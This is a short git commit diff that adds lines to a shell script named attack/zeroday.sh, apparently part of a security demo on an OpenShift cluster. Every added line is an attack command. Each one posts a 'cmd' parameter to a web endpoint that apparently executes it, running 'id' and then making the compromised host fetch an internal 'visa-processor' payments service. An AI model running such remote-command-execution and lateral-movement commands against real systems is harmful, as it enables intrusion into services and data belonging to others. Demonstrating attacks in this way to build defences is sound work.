2ab60ee002239cb1a084c0c882bc271b536dd6c2
Rodrigo Alvares <ralvares@redhat.com>
2023-05-26 09:46:25 +0200

    Add script

--- attack/zeroday.sh
+++ attack/zeroday.sh
@@ -1,1 +1,3 @@
-wget -q -O - --post-data 'cmd=wget -O - http://visa-processor-service.payments:8080' http://zeroday-zeroday.apps.ocp.ralvares.com/posts
+wget -q -O - --post-data 'cmd=id' http://zeroday-zeroday.apps.ocp.ralvares.com/posts
+
+echo "Connecting to VISA-PROCESSOR.." && wget -q -O - --post-data 'cmd=wget -O - http://visa-processor-service.payments:8080' http://zeroday-zeroday.apps.ocp.ralvares.com/posts
